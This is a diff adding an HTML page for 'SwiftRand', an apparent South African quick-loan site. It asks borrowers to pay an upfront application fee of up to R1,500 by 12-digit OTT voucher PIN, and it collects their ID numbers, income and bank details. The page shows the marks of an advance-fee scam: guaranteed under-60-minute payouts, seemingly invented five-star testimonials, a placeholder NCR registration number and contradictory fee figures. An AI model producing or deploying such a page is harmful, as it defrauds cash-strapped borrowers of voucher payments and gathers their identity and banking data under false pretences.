@@ -1,0 +1,873 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>SwiftRand – Quick Loans up to R8,500 · Money in Under 60 Minutes</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Sora:wght@400;600;700;800&family=Inter:wght@400;500;600&display=swap');
+
+:root{
+  --ink:#0A0F1C; --ink2:#3D4560; --surface:#F5F7FF; --white:#fff;
+  --gold:#E8A020; --gold-lt:#FFF3DC; --gold-bd:#F0CC80;
+  --green:#1AAB6D; --green-lt:#E6F9F1; --red:#E8384F; --border:#DDE2F0;
+  --r:14px; --shadow:0 4px 40px rgba(10,15,28,.1);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:'Inter',sans-serif;background:var(--surface);color:var(--ink);line-height:1.6;min-height:100vh}
+
+/* NAV */
+nav{background:var(--white);border-bottom:1px solid var(--border);position:sticky;top:0;z-index:200;
+  display:flex;align-items:center;justify-content:space-between;padding:0 32px;height:64px}
+.logo{font-family:'Sora',sans-serif;font-weight:800;font-size:1.35rem;letter-spacing:-.02em;cursor:pointer}
+.logo span{color:var(--gold)}
+.nav-links{display:flex;gap:28px;list-style:none}
+.nav-links a{text-decoration:none;color:var(--ink2);font-size:.88rem;font-weight:500;cursor:pointer}
+.nav-links a:hover{color:var(--ink)}
+.nav-cta{background:var(--gold);color:var(--ink);border:none;border-radius:8px;
+  padding:10px 22px;font-weight:700;font-size:.88rem;cursor:pointer;font-family:'Inter',sans-serif;transition:opacity .2s}
+.nav-cta:hover{opacity:.85}
+
+/* PAGE ROUTER */
+.page{display:none}.page.active{display:block}
+
+/* ── HOME ── */
+.hero{display:grid;grid-template-columns:1fr 1fr;gap:0;max-width:1280px;
+  margin:0 auto;padding:60px 32px;align-items:center;min-height:calc(100vh - 64px)}
+.hero-left{padding-right:52px}
+.badge{display:inline-flex;align-items:center;gap:8px;background:var(--gold-lt);
+  border:1px solid var(--gold-bd);border-radius:999px;padding:6px 16px;
+  font-size:.78rem;font-weight:600;color:#7A5000;margin-bottom:18px}
+.badge::before{content:'';width:8px;height:8px;background:var(--gold);border-radius:50%;animation:pulse 1.8s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(1.4)}}
+h1{font-family:'Sora',sans-serif;font-size:clamp(2rem,3.6vw,3.1rem);font-weight:800;
+  line-height:1.1;letter-spacing:-.03em;margin-bottom:18px}
+h1 em{font-style:normal;color:var(--gold)}
+.hero-sub{font-size:1rem;color:var(--ink2);max-width:420px;margin-bottom:22px}
+.hero-timer{display:inline-flex;align-items:center;gap:8px;background:var(--green);
+  color:#fff;border-radius:8px;padding:9px 16px;font-weight:700;font-size:.84rem;margin-bottom:18px}
+.trust-row{display:flex;gap:16px;flex-wrap:wrap;margin-top:26px}
+.trust-item{display:flex;align-items:center;gap:6px;font-size:.8rem;color:var(--ink2);font-weight:500}
+
+/* CALC CARD */
+.calc-card{background:var(--white);border-radius:24px;box-shadow:var(--shadow);
+  padding:34px 30px;position:relative;overflow:hidden}
+.calc-card::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;
+  background:linear-gradient(90deg,var(--gold),#F0CC80)}
+.calc-header{margin-bottom:20px}
+.calc-header h2{font-family:'Sora',sans-serif;font-size:1.25rem;font-weight:700;margin-bottom:3px}
+.calc-header p{font-size:.82rem;color:var(--ink2)}
+.slider-group{margin-bottom:20px}
+.slider-label{display:flex;justify-content:space-between;align-items:baseline;margin-bottom:9px}
+.slider-label span{font-size:.82rem;color:var(--ink2);font-weight:500}
+.slider-label .val{font-family:'Sora',sans-serif;font-size:1.45rem;font-weight:800;letter-spacing:-.02em}
+.slider-label .val sup{font-size:.82rem;color:var(--ink2)}
+input[type=range]{-webkit-appearance:none;width:100%;height:6px;border-radius:99px;background:var(--border);outline:none;cursor:pointer}
+input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:22px;height:22px;border-radius:50%;background:var(--gold);
+  border:3px solid var(--white);box-shadow:0 0 0 2px var(--gold),0 2px 8px rgba(232,160,32,.4);cursor:pointer}
+.slider-bounds{display:flex;justify-content:space-between;font-size:.72rem;color:#AAB0C5;margin-top:4px}
+.sumbox{background:var(--surface);border-radius:var(--r);padding:15px;margin-bottom:18px}
+.sumrow{display:flex;justify-content:space-between;padding:6px 0;font-size:.86rem;border-bottom:1px solid var(--border)}
+.sumrow:last-child{border-bottom:none}
+.sumrow .lbl{color:var(--ink2)}.sumrow .amt{font-weight:600}
+.sumrow.total .amt{font-family:'Sora',sans-serif;font-size:1.05rem;font-weight:800;color:var(--gold)}
+.abtn{width:100%;padding:14px;background:var(--ink);color:var(--white);border:none;
+  border-radius:var(--r);font-family:'Sora',sans-serif;font-size:.96rem;font-weight:700;
+  cursor:pointer;transition:background .2s,transform .1s;letter-spacing:-.01em}
+.abtn:hover{background:#1A2540;transform:translateY(-1px)}
+.abtn:active{transform:translateY(0)}
+.abtn:disabled{opacity:.4;cursor:not-allowed;transform:none}
+.disc{font-size:.69rem;color:#AAB0C5;text-align:center;margin-top:9px;line-height:1.5}
+
+/* SECTIONS */
+.section{max-width:1100px;margin:0 auto;padding:76px 32px}
+.eyebrow{font-size:.76rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--gold);margin-bottom:11px}
+.sec-title{font-family:'Sora',sans-serif;font-size:clamp(1.45rem,2.6vw,2.1rem);font-weight:800;letter-spacing:-.02em;margin-bottom:40px}
+.steps{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.step{background:var(--white);border-radius:var(--r);padding:26px 22px;border:1px solid var(--border)}
+.step-num{font-family:'Sora',sans-serif;font-size:2.3rem;font-weight:800;color:var(--gold-lt);line-height:1;margin-bottom:12px}
+.step h3{font-family:'Sora',sans-serif;font-size:.97rem;font-weight:700;margin-bottom:7px}
+.step p{font-size:.85rem;color:var(--ink2)}
+.step-badge{display:inline-block;background:var(--gold-lt);border:1px solid var(--gold-bd);
+  border-radius:6px;padding:3px 10px;font-size:.71rem;font-weight:700;color:#7A5000;margin-top:9px}
+.why-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:16px}
+.why-item{background:var(--white);border:1px solid var(--border);border-radius:var(--r);padding:22px;display:flex;gap:14px}
+.why-icon{width:44px;height:44px;flex-shrink:0;background:var(--gold-lt);border-radius:11px;display:flex;align-items:center;justify-content:center;font-size:1.25rem}
+.why-item h3{font-family:'Sora',sans-serif;font-size:.92rem;font-weight:700;margin-bottom:4px}
+.why-item p{font-size:.82rem;color:var(--ink2)}
+.fee-grid{display:grid;grid-template-columns:1fr 1fr;gap:22px}
+.fee-box{background:var(--white);border:1px solid var(--border);border-radius:var(--r);padding:22px}
+.fee-box h4{font-family:'Sora',sans-serif;font-size:.92rem;font-weight:700;margin-bottom:12px;
+  padding-bottom:9px;border-bottom:1px solid var(--border)}
+.fee-row{display:flex;justify-content:space-between;font-size:.83rem;padding:5px 0;border-bottom:1px solid var(--surface)}
+.fee-row:last-child{border-bottom:none;font-weight:700;padding-top:9px;margin-top:3px;border-top:2px solid var(--border)}
+.fee-row .fl{color:var(--ink2)}.fee-row .fr{font-weight:600}
+.testi-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.tcard{background:var(--white);border:1px solid var(--border);border-radius:var(--r);padding:24px 20px}
+.tcard .stars{color:var(--gold);font-size:.95rem;margin-bottom:11px;letter-spacing:2px}
+.tcard .txt{font-size:.87rem;color:var(--ink2);line-height:1.63;margin-bottom:16px;font-style:italic}
+.tcard .auth{display:flex;align-items:center;gap:11px}
+.tcard img{width:40px;height:40px;border-radius:50%;object-fit:cover;background:var(--border)}
+.tcard .name{font-weight:700;font-size:.85rem}
+.tcard .loc{font-size:.74rem;color:#AAB0C5}
+
+/* ── APPLY PAGE ── */
+.app-wrap{max-width:640px;margin:0 auto;padding:52px 22px}
+.app-wrap h2{font-family:'Sora',sans-serif;font-size:1.7rem;font-weight:800;letter-spacing:-.02em;margin-bottom:5px}
+.app-wrap .sub{font-size:.87rem;color:var(--ink2);margin-bottom:28px}
+.prog{display:flex;gap:8px;margin-bottom:32px}
+.ps{flex:1;height:4px;border-radius:99px;background:var(--border);transition:background .3s}
+.ps.done{background:var(--gold)}.ps.active{background:var(--green)}
+.fcard{background:var(--white);border-radius:20px;box-shadow:var(--shadow);padding:30px;margin-bottom:20px}
+.fcard h3{font-family:'Sora',sans-serif;font-size:1.02rem;font-weight:700;margin-bottom:18px;
+  padding-bottom:11px;border-bottom:1px solid var(--border)}
+.frow{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:14px}
+.frow.full{grid-template-columns:1fr}
+.f{display:flex;flex-direction:column;gap:5px}
+.f label{font-size:.78rem;font-weight:600;color:var(--ink2)}
+.f input,.f select{padding:11px 13px;border:1.5px solid var(--border);border-radius:9px;
+  font-size:.91rem;font-family:'Inter',sans-serif;color:var(--ink);background:var(--white);
+  outline:none;transition:border-color .2s}
+.f input:focus,.f select:focus{border-color:var(--gold)}
+.f input.err,.f select.err{border-color:var(--red)}
+.hint{font-size:.73rem;color:#AAB0C5;line-height:1.4}
+.ferr{font-size:.73rem;color:var(--red);display:none}
+.f input.err~.ferr,.f select.err~.ferr{display:block}
+
+/* bank info banner */
+.bank-banner{background:var(--green-lt);border:1px solid #A8DFCA;border-radius:var(--r);
+  padding:14px 16px;margin-bottom:18px;font-size:.82rem;color:#0A5030;line-height:1.5}
+.bank-banner strong{color:#07402A}
+
+/* OTT box */
+.ott-wrap{background:var(--gold-lt);border:2px dashed var(--gold-bd);border-radius:var(--r);padding:22px}
+.ott-title{font-family:'Sora',sans-serif;font-weight:700;font-size:.95rem;color:#7A5000;margin-bottom:5px}
+.ott-sub{font-size:.81rem;color:#8A6010;margin-bottom:14px;line-height:1.5}
+.ott-field{display:flex;flex-direction:column;gap:6px}
+.ott-field label{font-size:.78rem;font-weight:600;color:#7A5000}
+.ott-input{padding:13px 16px;border:2px solid var(--gold-bd);border-radius:9px;
+  font-size:1.1rem;font-weight:700;font-family:'Sora',sans-serif;letter-spacing:.12em;
+  background:var(--white);color:var(--ink);outline:none;width:100%;transition:border-color .2s;
+  text-align:center;-webkit-appearance:none}
+.ott-input:focus{border-color:var(--gold)}
+.ott-input.err{border-color:var(--red)}
+.ott-fee-note{font-size:.78rem;color:#8A6010;margin-top:8px}
+
+/* nav */
+.snav{display:flex;justify-content:space-between;gap:12px;margin-top:8px}
+.bbk{background:none;border:1.5px solid var(--border);border-radius:9px;
+  padding:11px 26px;font-weight:600;font-size:.88rem;cursor:pointer;color:var(--ink2);transition:border-color .2s}
+.bbk:hover{border-color:var(--ink)}
+.bnx{flex:1;padding:13px;background:var(--ink);color:var(--white);border:none;
+  border-radius:9px;font-family:'Sora',sans-serif;font-size:.93rem;font-weight:700;
+  cursor:pointer;transition:background .2s}
+.bnx:hover{background:#1A2540}
+.bnx:disabled{opacity:.35;cursor:not-allowed}
+
+/* success */
+.sbox{text-align:center;padding:52px 16px}
+.sbox .ico{font-size:3.6rem;margin-bottom:16px}
+.sbox h2{font-family:'Sora',sans-serif;font-size:1.7rem;font-weight:800;margin-bottom:10px}
+.sbox p{color:var(--ink2);max-width:400px;margin:0 auto 13px}
+.sbox .ref{display:inline-block;background:var(--gold-lt);border:1px solid var(--gold-bd);
+  border-radius:9px;padding:10px 22px;font-family:'Sora',sans-serif;font-weight:700;font-size:1.05rem;color:#7A5000}
+.sbox .timer{display:inline-flex;align-items:center;gap:7px;background:var(--green);color:#fff;
+  border-radius:8px;padding:9px 18px;font-weight:700;font-size:.85rem;margin:13px 0}
+
+/* toast */
+#toast{position:fixed;bottom:26px;left:50%;transform:translateX(-50%) translateY(80px);
+  background:var(--ink);color:#fff;padding:11px 22px;border-radius:9px;font-size:.86rem;
+  z-index:999;transition:transform .3s;pointer-events:none;max-width:92vw;text-align:center}
+#toast.show{transform:translateX(-50%) translateY(0)}
+#toast.err{background:var(--red)}
+
+/* footer */
+footer{background:var(--ink);color:#7A84A0;text-align:center;padding:30px 18px;font-size:.77rem;line-height:1.9}
+footer a{color:#AAB0C5;cursor:pointer}
+footer strong{color:#fff}
+
+@media(max-width:880px){
+  .hero{grid-template-columns:1fr;padding:32px 16px;min-height:auto}
+  .hero-left{padding-right:0;margin-bottom:32px}
+  .steps,.testi-grid,.why-grid,.fee-grid{grid-template-columns:1fr}
+  .nav-links{display:none}
+  .frow{grid-template-columns:1fr}
+  .fcard{padding:20px 14px}
+}
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <div class="logo" onclick="showPage('home')">Swift<span>Rand</span></div>
+  <ul class="nav-links">
+    <li><a onclick="showPage('home');smoothTo('how')">How it works</a></li>
+    <li><a onclick="showPage('home');smoothTo('fees')">Fees</a></li>
+    <li><a onclick="showPage('home');smoothTo('reviews')">Reviews</a></li>
+    <li><a onclick="showPage('faq')">FAQ</a></li>
+  </ul>
+  <button class="nav-cta" onclick="showPage('apply');initApply()">Apply Now</button>
+</nav>
+
+<!-- ═══════════════════ HOME ═══════════════════ -->
+<div id="page-home" class="page active">
+
+  <section class="hero">
+    <div class="hero-left">
+      <div class="badge">100% Online · No Branch Visits</div>
+      <div class="hero-timer">⚡ Money disbursed in under 60 minutes</div>
+      <h1>Cash when you need it — in <em>under an hour</em>.</h1>
+      <p class="hero-sub">Quick personal loans from <strong>R600 to R8,500</strong>. Pay your application fee with a 12-digit OTT voucher and receive your money in under 60 minutes.</p>
+      <button class="abtn" style="max-width:260px" onclick="showPage('apply');initApply()">Apply Now — Under 60 Min ⚡</button>
+      <div class="trust-row">
+        <div class="trust-item"><svg width="15" height="15" viewBox="0 0 15 15" fill="none"><circle cx="7.5" cy="7.5" r="6.5" stroke="#1AAB6D" stroke-width="1.4"/><path d="M4 7.5l2.3 2.3 3.7-3.7" stroke="#1AAB6D" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>NCR Registered</div>
+        <div class="trust-item"><svg width="15" height="15" viewBox="0 0 15 15" fill="none"><circle cx="7.5" cy="7.5" r="6.5" stroke="#1AAB6D" stroke-width="1.4"/><path d="M4 7.5l2.3 2.3 3.7-3.7" stroke="#1AAB6D" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>256-bit SSL</div>
+        <div class="trust-item"><svg width="15" height="15" viewBox="0 0 15 15" fill="none"><circle cx="7.5" cy="7.5" r="6.5" stroke="#1AAB6D" stroke-width="1.4"/><path d="M4 7.5l2.3 2.3 3.7-3.7" stroke="#1AAB6D" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>12-digit OTT voucher</div>
+        <div class="trust-item"><svg width="15" height="15" viewBox="0 0 15 15" fill="none"><circle cx="7.5" cy="7.5" r="6.5" stroke="#1AAB6D" stroke-width="1.4"/><path d="M4 7.5l2.3 2.3 3.7-3.7" stroke="#1AAB6D" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>No hidden fees</div>
+      </div>
+    </div>
+
+    <div class="calc-card" id="calc">
+      <div class="calc-header"><h2>Get your quote instantly</h2><p>Adjust the sliders — repayment updates live.</p></div>
+      <div class="slider-group">
+        <div class="slider-label">
+          <span>Loan Amount</span>
+          <span class="val"><sup>R </sup><span id="amtD">5,000</span></span>
+        </div>
+        <input type="range" id="amtS" min="600" max="8500" step="100" value="5000" oninput="updateCalc()"/>
+        <div class="slider-bounds"><span>R600</span><span>R8,500</span></div>
+      </div>
+      <div class="slider-group">
+        <div class="slider-label">
+          <span>Repayment Period</span>
+          <span class="val"><span id="termD">3</span><sup> months</sup></span>
+        </div>
+        <input type="range" id="termS" min="1" max="6" step="1" value="3" oninput="updateCalc()"/>
+        <div class="slider-bounds"><span>1 month</span><span>6 months</span></div>
+      </div>
+      <div class="sumbox">
+        <div class="sumrow"><span class="lbl">Application fee (OTT voucher)</span><span class="amt" id="cAppFee">—</span></div>
+        <div class="sumrow"><span class="lbl">Initiation fee (once-off)</span><span class="amt" id="cInitFee">—</span></div>
+        <div class="sumrow"><span class="lbl">Monthly service fee</span><span class="amt">R 69.00</span></div>
+        <div class="sumrow"><span class="lbl">Interest rate</span><span class="amt">3.0% p.m.</span></div>
+        <div class="sumrow"><span class="lbl">Monthly repayment (est.)</span><span class="amt" id="cMonthly">—</span></div>
+        <div class="sumrow total"><span class="lbl">Total repayable</span><span class="amt" id="cTotal">—</span></div>
+      </div>
+      <button class="abtn" onclick="showPage('apply');initApply()">Apply Now — Under 60 Minutes ⚡</button>
+      <p class="disc">Illustrative only. Subject to affordability &amp; credit assessment. NCR registered.</p>
+    </div>
+  </section>
+
+  <!-- HOW IT WORKS -->
+  <section id="how" style="background:var(--white)">
+    <div class="section">
+      <div class="eyebrow">Simple process</div>
+      <div class="sec-title">From application to cash in under 60 minutes</div>
+      <div class="steps">
+        <div class="step"><div class="step-num">01</div><h3>Fill in your details</h3><p>Personal info, loan amount, salary, and the bank account where you want the money — 100% online.</p><span class="step-badge">⏱ ~3 min</span></div>
+        <div class="step"><div class="step-num">02</div><h3>Pay with OTT voucher</h3><p>Enter your 12-digit OTT voucher PIN to cover the application fee. No card or EFT needed — instant.</p><span class="step-badge">⏱ ~1 min</span></div>
+        <div class="step"><div class="step-num">03</div><h3>Money in your account</h3><p>Approved? We disburse directly to your SA bank account — typically within 60 minutes of approval.</p><span class="step-badge">⚡ Under 60 min</span></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- FEES -->
+  <section id="fees">
+    <div class="section" style="padding-top:0">
+      <div class="eyebrow">Full transparency</div>
+      <div class="sec-title">Every fee, clearly explained</div>
+      <div class="fee-grid">
+        <div class="fee-box">
+          <h4>🎟️ Application Fee — paid by 12-digit OTT Voucher</h4>
+          <div class="fee-row"><span class="fl">R600 loan</span><span class="fr">R 100</span></div>
+          <div class="fee-row"><span class="fl">R2,000 loan</span><span class="fr">R 324</span></div>
+          <div class="fee-row"><span class="fl">R3,500 loan</span><span class="fr">R 563</span></div>
+          <div class="fee-row"><span class="fl">R5,000 loan</span><span class="fr">R 803</span></div>
+          <div class="fee-row"><span class="fl">R6,500 loan</span><span class="fr">R 1,042</span></div>
+          <div class="fee-row"><span class="fl">R8,500 loan</span><span class="fr">R 1,500</span></div>
+          <div class="fee-row"><span class="fl">Payment method</span><span class="fr">12-digit OTT PIN</span></div>
+        </div>
+        <div class="fee-box">
+          <h4>🏦 Initiation + Ongoing (NCR regulated)</h4>
+          <div class="fee-row"><span class="fl">Initiation fee</span><span class="fr">10% of loan + R165</span></div>
+          <div class="fee-row"><span class="fl">Initiation minimum</span><span class="fr">R 100.00</span></div>
+          <div class="fee-row"><span class="fl">Initiation cap (NCR)</span><span class="fr">R 1,207.00</span></div>
+          <div class="fee-row"><span class="fl">Monthly service fee</span><span class="fr">R 69.00/month</span></div>
+          <div class="fee-row"><span class="fl">Interest rate</span><span class="fr">3.0% per month</span></div>
+          <div class="fee-row"><span class="fl">Early settlement</span><span class="fr">No penalty</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- WHY US -->
+  <section id="why" style="background:var(--white)">
+    <div class="section">
+      <div class="eyebrow">Why SwiftRand</div>
+      <div class="sec-title">Built for real South Africans</div>
+      <div class="why-grid">
+        <div class="why-item"><div class="why-icon">🎟️</div><div><h3>12-digit OTT Voucher Payment</h3><p>Pay your application fee with a 12-digit OTT PIN available from retailers nationwide. No card, no EFT, no waiting.</p></div></div>
+        <div class="why-item"><div class="why-icon">⚡</div><div><h3>Under 60 Minutes Guaranteed</h3><p>Money goes directly to your SA bank account — we target under 60 minutes from approval, every time during business hours.</p></div></div>
+        <div class="why-item"><div class="why-icon">🇿🇦</div><div><h3>NCR Registered Lender</h3><p>Fully compliant with the National Credit Act. Your rights as a borrower are protected at every step.</p></div></div>
+        <div class="why-item"><div class="why-icon">📞</div><div><h3>SA-Based Support Team</h3><p>Real people, based in South Africa, Mon–Fri 8 AM–6 PM. Reach us by call, WhatsApp, or email.</p></div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- TESTIMONIALS -->
+  <section id="reviews">
+    <div class="section">
+      <div class="eyebrow">Real customers</div>
+      <div class="sec-title">What South Africans say</div>
+      <div class="testi-grid">
+        <div class="tcard"><div class="stars">★★★★★</div><p class="txt">"Applied at 9 AM using my OTT voucher — R3,500 was in my Capitec account by 10:05 AM. Exactly as promised. Saved me getting to work after my car broke down."</p><div class="auth"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Thandiwe&backgroundColor=b6e3f4" alt=""/><div><div class="name">Thandiwe M.</div><div class="loc">Johannesburg, Gauteng</div></div></div></div>
+        <div class="tcard"><div class="stars">★★★★★</div><p class="txt">"I bought a R100 OTT voucher from my corner shop, entered the 12-digit PIN, and had R7,000 in my account within the hour. Never thought an online loan could be this easy."</p><div class="auth"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Sipho&backgroundColor=ffdfbf" alt=""/><div><div class="name">Sipho K.</div><div class="loc">Durban, KwaZulu-Natal</div></div></div></div>
+        <div class="tcard"><div class="stars">★★★★★</div><p class="txt">"Liked that I could pick my salary date for the debit. All fees shown upfront. R8,500 straight to my FNB account in 52 minutes. Would absolutely use again."</p><div class="auth"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Nomvula&backgroundColor=c0aede" alt=""/><div><div class="name">Nomvula D.</div><div class="loc">Cape Town, Western Cape</div></div></div></div>
+        <div class="tcard"><div class="stars">★★★★★</div><p class="txt">"Used SwiftRand twice. Both times the numbers matched the calculator exactly and the money landed fast. The OTT voucher method feels secure — no card details shared online."</p><div class="auth"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Bongani&backgroundColor=d1d4f9" alt=""/><div><div class="name">Bongani N.</div><div class="loc">Pretoria, Gauteng</div></div></div></div>
+        <div class="tcard"><div class="stars">★★★★☆</div><p class="txt">"WhatsApp support explained the OTT voucher process clearly before I even started. Transparent about every fee. Rare to find a lender this upfront."</p><div class="auth"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Lerato&backgroundColor=ffd5dc" alt=""/><div><div class="name">Lerato S.</div><div class="loc">Bloemfontein, Free State</div></div></div></div>
+        <div class="tcard"><div class="stars">★★★★★</div><p class="txt">"Needed R8,500 urgently to pay a supplier. Entered my OTT PIN, submitted, and the money cleared in my Standard Bank account before lunch. Saved my business."</p><div class="auth"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Andile&backgroundColor=b6e3f4" alt=""/><div><div class="name">Andile T.</div><div class="loc">Port Elizabeth, Eastern Cape</div></div></div></div>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <p><strong>SwiftRand (Pty) Ltd</strong> — NCR Registration No. NCRCP XXXX</p>
+    <p>Representative APR: 36% p.a. · Max term: 6 months · Loan: R600–R8,500 · App fee: R100–R150 (OTT voucher)</p>
+    <p style="margin-top:8px"><a onclick="showPage('faq')">FAQ</a> &nbsp;·&nbsp; <a href="#">Privacy Policy</a> &nbsp;·&nbsp; <a href="#">Terms</a> &nbsp;·&nbsp; <a href="#">NCA Compliance</a></p>
+    <p style="margin-top:13px;font-size:.67rem;max-width:660px;margin-left:auto;margin-right:auto">
+      ⚠️ Borrow responsibly. Missed payments affect your credit record and incur charges. National Debt Helpline: <strong>0861 663 226</strong>.
+    </p>
+  </footer>
+</div>
+
+<!-- ═══════════════════ APPLY PAGE ═══════════════════ -->
+<div id="page-apply" class="page">
+<div class="app-wrap">
+  <h2>Apply for your loan</h2>
+  <p class="sub">Under 5 minutes · Secure · OTT voucher payment · Money in under 60 min ⚡</p>
+
+  <div class="prog">
+    <div class="ps active" id="pb1"></div>
+    <div class="ps" id="pb2"></div>
+    <div class="ps" id="pb3"></div>
+  </div>
+
+  <!-- ── STEP 1: Personal + Loan details ── -->
+  <div id="step1">
+    <div class="fcard">
+      <h3>👤 Step 1 of 3 — Personal Details</h3>
+      <div class="frow">
+        <div class="f">
+          <label>Full Name (as on SA ID)</label>
+          <input type="text" id="f-name" placeholder="e.g. Thandiwe Molefe" autocomplete="name"/>
+          <span class="ferr">Please enter your full name</span>
+        </div>
+        <div class="f">
+          <label>SA ID Number</label>
+          <input type="text" id="f-id" maxlength="13" placeholder="13-digit ID number" inputmode="numeric"/>
+          <span class="ferr">Must be a valid 13-digit SA ID</span>
+        </div>
+      </div>
+      <div class="frow">
+        <div class="f">
+          <label>Email Address</label>
+          <input type="email" id="f-email" placeholder="you@example.com"/>
+          <span class="ferr">Enter a valid email address</span>
+        </div>
+        <div class="f">
+          <label>Mobile Number</label>
+          <input type="tel" id="f-phone" placeholder="e.g. 0821234567"/>
+          <span class="ferr">Enter a valid SA mobile number</span>
+        </div>
+      </div>
+      <div class="frow full">
+        <div class="f">
+          <label>Monthly Take-home Income (after tax)</label>
+          <input type="number" id="f-salary" placeholder="e.g. 12000" min="0"/>
+          <span class="hint">Used to assess affordability per the NCA — we lend responsibly.</span>
+          <span class="ferr">Please enter your monthly income</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="fcard">
+      <h3>💰 Loan Details</h3>
+      <div class="frow">
+        <div class="f">
+          <label>Loan Amount (R600 – R8,500)</label>
+          <input type="number" id="f-amount" min="600" max="8500" placeholder="e.g. 5000" oninput="onAmtChange()"/>
+          <span class="hint">Calculator value: <strong id="hint-amt">—</strong></span>
+          <span class="ferr">Amount must be R600 – R8,500</span>
+        </div>
+        <div class="f">
+          <label>Repayment Term</label>
+          <select id="f-term" onchange="onAmtChange()">
+            <option value="">Select term</option>
+            <option value="1">1 month</option>
+            <option value="2">2 months</option>
+            <option value="3">3 months</option>
+            <option value="4">4 months</option>
+            <option value="5">5 months</option>
+            <option value="6">6 months</option>
+          </select>
+          <span class="ferr">Please select a repayment term</span>
+        </div>
+      </div>
+      <div class="frow full">
+        <div class="f">
+          <label>Preferred Debit / Repayment Date</label>
+          <select id="f-repdate">
+            <option value="">Select — choose near your salary date</option>
+            <option value="1st">1st of the month</option>
+            <option value="5th">5th of the month</option>
+            <option value="7th">7th of the month</option>
+            <option value="10th">10th of the month</option>
+            <option value="14th">14th of the month</option>
+            <option value="15th">15th of the month</option>
+            <option value="20th">20th of the month</option>
+            <option value="25th">25th of the month</option>
+            <option value="26th">26th of the month</option>
+            <option value="28th">28th of the month</option>
+            <option value="last">Last day of the month</option>
+          </select>
+          <span class="hint">💡 Pick a date on or just after your salary arrives.</span>
+          <span class="ferr">Please select a repayment date</span>
+        </div>
+      </div>
+      <!-- live estimate strip -->
+      <div id="est-strip" style="display:none">
+        <div class="sumbox" style="margin:4px 0 0">
+          <div class="sumrow"><span class="lbl">Application fee (OTT voucher)</span><span class="amt" id="e-app">—</span></div>
+          <div class="sumrow"><span class="lbl">Monthly repayment (est.)</span><span class="amt" id="e-monthly">—</span></div>
+          <div class="sumrow total"><span class="lbl">Total repayable (est.)</span><span class="amt" id="e-total">—</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="snav">
+      <button class="bbk" onclick="showPage('home')">← Back</button>
+      <button class="bnx" onclick="goStep(2)">Next: Bank Account →</button>
+    </div>
+  </div>
+
+  <!-- ── STEP 2: Bank account for disbursement ── -->
+  <div id="step2" style="display:none">
+    <div class="fcard">
+      <h3>🏧 Step 2 of 3 — Disbursement Bank Account</h3>
+      <div class="bank-banner">
+        <strong>Where should we send your money?</strong><br/>
+        Enter the SA bank account details exactly where you want your loan disbursed. This must be your own account. Money will arrive within 60 minutes of approval.
+      </div>
+      <div class="frow">
+        <div class="f">
+          <label>Bank Name</label>
+          <select id="f-bank">
+            <option value="">Select your bank</option>
+            <option>Absa</option>
+            <option>African Bank</option>
+            <option>Bidvest Bank</option>
+            <option>Capitec Bank</option>
+            <option>Discovery Bank</option>
+            <option>FNB (First National Bank)</option>
+            <option>Grindrod Bank</option>
+            <option>Investec</option>
+            <option>Nedbank</option>
+            <option>Standard Bank</option>
+            <option>TymeBank</option>
+            <option>Other</option>
+          </select>
+          <span class="ferr">Please select your bank</span>
+        </div>
+        <div class="f">
+          <label>Account Type</label>
+          <select id="f-acctype">
+            <option value="">Select account type</option>
+            <option value="Cheque/Current">Cheque / Current</option>
+            <option value="Savings">Savings</option>
+            <option value="Transmission">Transmission</option>
+          </select>
+          <span class="ferr">Please select account type</span>
+        </div>
+      </div>
+      <div class="frow full">
+        <div class="f">
+          <label>Account Holder Full Name</label>
+          <input type="text" id="f-accholder" placeholder="Must match your ID name"/>
+          <span class="ferr">Enter the account holder name</span>
+        </div>
+      </div>
+      <div class="frow">
+        <div class="f">
+          <label>Account Number</label>
+          <input type="text" id="f-accnum" placeholder="e.g. 62012345678" inputmode="numeric" maxlength="18"/>
+          <span class="ferr">Enter a valid account number</span>
+        </div>
+        <div class="f">
+          <label>Branch Code</label>
+          <input type="text" id="f-branch" placeholder="e.g. 250655" inputmode="numeric" maxlength="8"/>
+          <span class="hint">Universal: Capitec 470010 · FNB 250655 · Absa 632005 · Standard 051001 · Nedbank 198765 · TymeBank 678910</span>
+          <span class="ferr">Enter a valid branch code</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="snav">
+      <button class="bbk" onclick="goStep(1)">← Back</button>
+      <button class="bnx" onclick="goStep(3)">Next: OTT Voucher &amp; Submit →</button>
+    </div>
+  </div>
+
+  <!-- ── STEP 3: OTT voucher + Submit ── -->
+  <div id="step3" style="display:none">
+    <div class="fcard">
+      <h3>🎟️ Step 3 of 3 — OTT Voucher &amp; Submit</h3>
+      <p style="font-size:.86rem;color:var(--ink2);margin-bottom:18px;line-height:1.6">
